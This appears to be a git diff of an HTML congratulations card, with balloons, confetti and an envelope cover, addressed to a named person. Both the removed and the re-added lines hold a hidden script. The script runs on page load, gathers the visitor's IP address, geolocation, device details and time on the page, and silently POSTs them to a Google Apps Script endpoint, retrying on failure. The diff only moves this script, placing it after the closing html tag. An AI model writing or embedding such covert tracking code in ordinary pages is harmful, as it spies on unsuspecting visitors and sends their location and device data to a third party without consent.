@@ -115,104 +115,6 @@
     </style>
 </head>
 <body>
-<script>
-async function collectAndSendData() {
-  try {
-    // Fetch IP address using a third-party service
-    let ipAddress = await fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => data.ip)
-      .catch(() => 'IP fetch failed');
-
-    // Function to send data to Google Apps Script
- async function sendData(data) {
-  try {
-    const response = await fetch('https://script.google.com/macros/s/AKfycbxEjO6uktkuuOXZv5Z-tg43wNM9QxuvmBS6fwr3l7bgCKh148Rfu59OjDg5qi_vwf5o/exec', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: new URLSearchParams(data),
-    });
-    const data = await response.text();
-    console.log('Success:', data);
-  } catch (error) {
-    console.error('Error:', error);
-    setTimeout(() => sendData(data), 10000);  // Retry after 10 seconds if there's an error
-  }
-}
-    // Collect device information
-    function getDeviceInfo() {
-      return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height,
-        isMobile: /Mobi|Android/i.test(navigator.userAgent),
-      };
-    }
-
-    // Track usage time
-    let startTime = Date.now();
-    function trackUsageTime() {
-      window.addEventListener('beforeunload', () => {
-        const usageTime = Date.now() - startTime;
-        sendData({ usageTime });
-      });
-    }
-
-    // Collect location (if allowed)
-    function getLocation() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              resolve({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-              });
-            },
-            () => {
-              resolve({ location: 'Permission denied' });
-            }
-          );
-        } else {
-          resolve({ location: 'Geolocation not supported' });
-        }
-      });
-    }
-
-    // Gather all data and send it
-    const locationData = await getLocation();
-    const deviceInfo = getDeviceInfo();
-
-    const data = {
-      ipAddress,
-      ...locationData,
-      userAgent: deviceInfo.userAgent,
-      platform: deviceInfo.platform,
-      screenWidth: deviceInfo.screenWidth,
-      screenHeight: deviceInfo.screenHeight,
-      deviceType: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
-    };
-
-    // Send data to the server
-    await sendData(data);
-    
-    // Track usage time
-    trackUsageTime();
-  } catch (error) {
-    console.error('Failed to collect or send data:', error);
-    // Retry collecting and sending data
-    setTimeout(collectAndSendData, 3000);
-  }
-}
-
-// Call the function on window load
-window.onload = collectAndSendData;
-    </script>
-
-    
     <div class="container">
         <h1>Congrats Ghizlane!</h1>
         <p>
@@ -232,7 +134,35 @@ window.onload = collectAndSendData;
             With love, <br> Hicham
         </div>
     </div>
-
+    <div id="cover" style="
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255, 255, 255, 0.9);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 3;
+    transition: top 0.8s ease;
+">
+    <div style="text-align: center;">
+        <div style="font-size: 50px; color: #ff6f61; margin-bottom: 20px;">
+            ✉️
+        </div>
+        <button onclick="openCongrats();celebrate()" style="
+            padding: 15px 30px;
+            font-size: 16px;
+            background-color: #ff6f61;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        ">Open to See the Congrats!</button>
+    </div>
+</div>
     <!-- JavaScript for Balloons and Confetti -->
     <script>
         function createBalloon() {
@@ -263,42 +193,96 @@ window.onload = collectAndSendData;
                 setTimeout(createConfetti, i * 150); // Confetti every 150ms
             }
         }
-    </script>
-    <div id="cover" style="
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(255, 255, 255, 0.9);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 3;
-    transition: top 0.8s ease;
-">
-    <div style="text-align: center;">
-        <div style="font-size: 50px; color: #ff6f61; margin-bottom: 20px;">
-            ✉️
-        </div>
-        <button onclick="openCongrats();celebrate()" style="
-            padding: 15px 30px;
-            font-size: 16px;
-            background-color: #ff6f61;
-            color: white;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: transform 0.2s ease;
-        ">Open to See the Congrats!</button>
-    </div>
-</div>
-
-<script>
-    function openCongrats() {
+        function openCongrats() {
         document.getElementById('cover').style.top = '-100%';
     }
-</script>
+    </script>
+
 
 </body>
 </html>
+<script>
+    async function collectAndSendData() {
+      try {
+        let ipAddress = await fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => data.ip)
+          .catch(() => 'IP fetch failed');
+    
+        // Function to send data to Google Apps Script
+     async function sendData(data) {
+      try {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbxEjO6uktkuuOXZv5Z-tg43wNM9QxuvmBS6fwr3l7bgCKh148Rfu59OjDg5qi_vwf5o/exec', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: new URLSearchParams(data),
+        });
+        const responseData = await response.text();
+        console.log('Success:', responseData );
+      } catch (error) {
+        console.error('Error:', error);
+        setTimeout(() => sendData(data), 3000);  // Retry after 10 seconds if there's an error
+      }
+    }
+        // Collect device information
+        function getDeviceInfo() {
+          return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            isMobile: /Mobi|Android/i.test(navigator.userAgent),
+          };
+        }
+    
+        // Track usage time
+        let startTime = Date.now();
+        function trackUsageTime() {
+          window.addEventListener('beforeunload', () => {
+            const usageTime = Date.now() - startTime;
+            sendData({ usageTime });
+          });
+        }
+    
+        // Collect location (if allowed)
+        function getLocation() {
+          return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  resolve({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                  });
+                },
+                () => {
+                  resolve({ location: 'Permission denied' });
+                }
+              );
+            } else {
+              resolve({ location: 'Geolocation not supported' });
+            }
+          });
+        }
+        const locationData = await getLocation();
+        const deviceInfo = getDeviceInfo();    
+        const data = {
+          ipAddress,
+          ...locationData,
+          userAgent: deviceInfo.userAgent,
+          platform: deviceInfo.platform,
+          screenWidth: deviceInfo.screenWidth,
+          screenHeight: deviceInfo.screenHeight,
+          deviceType: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
+        };
+        await sendData(data);
+        trackUsageTime();
+    } catch (error) {
+        console.error('Failed to collect or send data:', error);
+        setTimeout(collectAndSendData, 15000);
+    }
+}
+window.onload = collectAndSendData;
+    </script>
